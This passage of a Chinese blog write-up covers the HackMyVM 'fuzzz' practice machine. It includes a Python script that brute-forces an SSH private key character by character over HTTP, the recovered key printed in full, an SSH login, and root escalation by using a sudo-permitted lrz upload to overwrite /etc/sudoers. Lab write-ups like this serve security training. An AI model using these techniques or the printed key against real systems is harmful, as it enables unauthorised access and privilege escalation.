class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.ascii_letters + string.digits + <span class="string">&quot;+/=-&quot;</span></span><br><span class="line">base_url = <span class="string">&quot;http://127.0.0.1:8888/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_rsa</span>():</span><br><span class="line">    id_rsa = [] <span class="comment"># 存储最终恢复的每行</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*]正在爆破第<span class="subst">&#123;line_num&#125;</span>行&quot;</span>)</span><br><span class="line"></span><br><span class="line">        current = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># 直到找不到字符说明这行结束了</span></span><br><span class="line">            found = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">                path = current + char</span><br><span class="line">                url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>line<span class="subst">&#123;line_num&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">                response = requests.head(url,timeout=<span class="number">5</span>,allow_redirects= <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                    current += char</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+]current_line:<span class="subst">&#123;current&#125;</span>&quot;</span>)</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span> <span class="comment"># 找到了一个就跳出内层循环</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> found :</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line">                <span class="keyword">break</span> <span class="comment"># 如果内层循环都找完了， 说明这行已经找完了</span></span><br><span class="line">        id_rsa.append(current)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]爆破完成&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>.join(id_rsa))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    brute_rsa()</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*]爆破完成</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span><br><span class="line">QyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u</span><br><span class="line">XwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw</span><br><span class="line">AAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J</span><br><span class="line">5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=</span><br></pre></td></tr></table></figure></div>
+<p>然后拼接上私钥的开头和结尾 拿到id_rsa</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──<span class="params">(root㉿kali)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># cat id_rsa1</span></span><br><span class="line"><span class="params">-----BEGIN</span> OPENSSH PRIVATE KEY<span class="params">-----</span></span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span><br><span class="line">QyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u</span><br><span class="line">XwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw</span><br><span class="line">AAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J</span><br><span class="line">5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=</span><br><span class="line"><span class="params">-----END</span> OPENSSH PRIVATE KEY<span class="params">-----</span></span><br></pre></td></tr></table></figure>
+<p>然后成功进入asahi用户</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/tmp]</span><br><span class="line">└─# chmod 600 id_rsa1</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/tmp]</span><br><span class="line">└─# ssh asahi@192.168.250.67 -i id_rsa1</span><br><span class="line"></span><br><span class="line">fuzzz:~$ id</span><br><span class="line"><span class="attribute">uid</span>=1001(asahi) <span class="attribute">gid</span>=1001(asahi) <span class="attribute">groups</span>=1001(asahi)</span><br><span class="line">fuzzz:~$</span><br></pre></td></tr></table></figure></div>
+<p>输入sudo -l 发现lrz有sudo权限</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">fuzzz:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> asahi <span class="keyword">on</span> <span class="title">fuzzz</span>:</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">Runas <span class="keyword">and</span> Command-specific defaults <span class="keyword">for</span> asahi:</span><br><span class="line">    Defaults!/usr/sbin/visudo env_keep+=<span class="string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span></span><br><span class="line"></span><br><span class="line">User asahi may run <span class="keyword">the</span> following commands <span class="keyword">on</span> <span class="title">fuzzz</span>:</span><br><span class="line">    (ALL) NOPASSWD: /usr/<span class="built_in">local</span>/bin/lrz</span><br><span class="line">fuzzz:~$ /usr/<span class="built_in">local</span>/bin/lrz -h</span><br><span class="line">lrz <span class="built_in">version</span> <span class="number">0.12</span><span class="number">.21</span>rc</span><br><span class="line">Usage: lrz [options] [filename.<span class="keyword">if</span>.xmodem]</span><br><span class="line">Receive <span class="built_in">files</span> <span class="keyword">with</span> ZMODEM/YMODEM/XMODEM protocol</span><br><span class="line">    (X) = option applies <span class="built_in">to</span> XMODEM only</span><br><span class="line">    (Y) = option applies <span class="built_in">to</span> YMODEM only</span><br><span class="line">    (Z) = option applies <span class="built_in">to</span> ZMODEM only</span><br><span class="line">  -+, <span class="comment">--append                append to existing files</span></span><br><span class="line">  -<span class="keyword">a</span>, <span class="comment">--ascii                 ASCII transfer (change CR/LF to LF)</span></span><br><span class="line">  -b, <span class="comment">--binary                binary transfer</span></span><br><span class="line">  -B, <span class="comment">--bufsize N             buffer N bytes (N==auto: buffer whole file)</span></span><br><span class="line">  -c, <span class="comment">--with-crc              Use 16 bit CRC (X)</span></span><br><span class="line">  -C, <span class="comment">--allow-remote-commands allow execution of remote commands (Z)</span></span><br><span class="line">  -D, <span class="comment">--null                  write all received data to /dev/null</span></span><br><span class="line">      <span class="comment">--delay-startup N       sleep N seconds before doing anything</span></span><br><span class="line">  -e, <span class="comment">--escape                Escape control characters (Z)</span></span><br><span class="line">  -E, <span class="comment">--rename                rename any files already existing</span></span><br><span class="line">      <span class="comment">--errors N              generate CRC error every N bytes (debugging)</span></span><br><span class="line">  -h, <span class="comment">--help                  Help, print this usage message</span></span><br><span class="line">  -m, <span class="comment">--min-bps N             stop transmission if BPS below N</span></span><br><span class="line">  -M, <span class="comment">--min-bps-time N          for at least N seconds (default: 120)</span></span><br><span class="line">  -O, <span class="comment">--disable-timeouts      disable timeout code, wait forever for data</span></span><br><span class="line">      <span class="comment">--o-sync                open output file(s) in synchronous write mode</span></span><br><span class="line">  -p, <span class="comment">--protect               protect existing files</span></span><br><span class="line">  -q, <span class="comment">--quiet                 quiet, no progress reports</span></span><br><span class="line">  -r, <span class="comment">--resume                try to resume interrupted file transfer (Z)</span></span><br><span class="line">  -R, <span class="comment">--restricted            restricted, more secure mode</span></span><br><span class="line">  -s, <span class="comment">--stop-at &#123;HH:MM|+N&#125;    stop transmission at HH:MM or in N seconds</span></span><br><span class="line">  -S, <span class="comment">--timesync              request remote time (twice: set local time)</span></span><br><span class="line">      <span class="comment">--syslog[=off]          turn syslog on or off, if possible</span></span><br><span class="line">  -t, <span class="comment">--timeout N             set timeout to N tenths of a second</span></span><br><span class="line">      <span class="comment">--tcp-server            open socket, wait for connection (Z)</span></span><br><span class="line">      <span class="comment">--tcp-client ADDR:PORT  open socket, connect to ... (Z)</span></span><br><span class="line">  -u, <span class="comment">--keep-uppercase        keep upper case filenames</span></span><br><span class="line">  -U, <span class="comment">--unrestrict            disable restricted mode (if allowed to)</span></span><br><span class="line">  -v, <span class="comment">--verbose               be verbose, provide debugging information</span></span><br><span class="line">  -w, <span class="comment">--windowsize N          Window is N bytes (Z)</span></span><br><span class="line">  -X  <span class="comment">--xmodem                use XMODEM protocol</span></span><br><span class="line">  -y, <span class="comment">--overwrite             Yes, clobber existing file if any</span></span><br><span class="line">      <span class="comment">--ymodem                use YMODEM protocol</span></span><br><span class="line">  -Z, <span class="comment">--zmodem                use ZMODEM protocol</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">short</span> options use <span class="keyword">the</span> same arguments <span class="keyword">as</span> <span class="keyword">the</span> <span class="keyword">long</span> ones</span><br></pre></td></tr></table></figure></div>
+<p>lrz是一个文件上传的命令 然后看选项，发现-y是强制覆盖选项<br>所以写一个sodoers文件 在&#x2F;etc目录下面开启这个服务</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">fuzzz:</span>/etc<span class="variable">$ </span>sudo /usr/local/bin/lrz -y</span><br><span class="line"><span class="symbol">fuzzz:</span>/etc<span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> asahi on <span class="symbol">fuzzz:</span></span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Runas</span> <span class="keyword">and</span> <span class="title class_">Command</span>-specific defaults <span class="keyword">for</span> <span class="symbol">asahi:</span></span><br><span class="line">    <span class="title class_">Defaults</span>!/usr/sbin/visudo env_keep+=<span class="string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> asahi may run the following commands on <span class="symbol">fuzzz:</span></span><br><span class="line">    (<span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/local/bin/lrz</span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> <span class="title class_">ALL</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>这里我用的final shell 写命令后会让选择文件，上传之后就发现当前用户用所有权限了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fuzzz</span>:/etc$ sudo su -</span><br><span class="line"><span class="attribute">fuzzz</span>:~# id</span><br><span class="line"><span class="attribute">uid</span>=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">0</span>(root),<span class="number">1</span>(bin),<span class="number">2</span>(daemon),<span class="number">3</span>(sys),<span class="number">4</span>(adm),<span class="number">6</span>(disk),<span class="number">10</span>(wheel),<span class="number">11</span>(floppy),<span class="number">20</span>(dialout),<span class="number">26</span>(tape),<span class="number">27</span>(video)</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>学习了adb是一个调试攻击 可以用adb shell 得到一个shell</li>
+<li>除了socat  学习chisel这个工具以及这里的端口转发用法 反向连接</li>
+<li>知道要对私钥的内容更加敏感 这里的b3B 就是id_rsa的开头</li>
+<li>提高脚本编写的能力</li>
+<li>最后用lrz的文件覆盖 用sudoers文件提权</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/28301.html" title="HMV-fuzzz复现">https://guayu-kakeru.github.io/posts/28301.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/59614.html" rel="prev" title="CISP-PTE综合题做题笔记">
+      <i class="fa fa-chevron-left"></i> CISP-PTE综合题做题笔记
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">82</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/28301.html" title="posts&#x2F;28301.html">HMV-fuzzz复现</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/59614.html" title="posts&#x2F;59614.html">CISP-PTE综合题做题笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/19448.html" title="posts&#x2F;19448.html">cisp-pte基础题笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/13378.html" title="posts&#x2F;13378.html">cisp-pte客观题笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/36422.html" title="posts&#x2F;36422.html">Vulnhub-Pwnlab:init</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
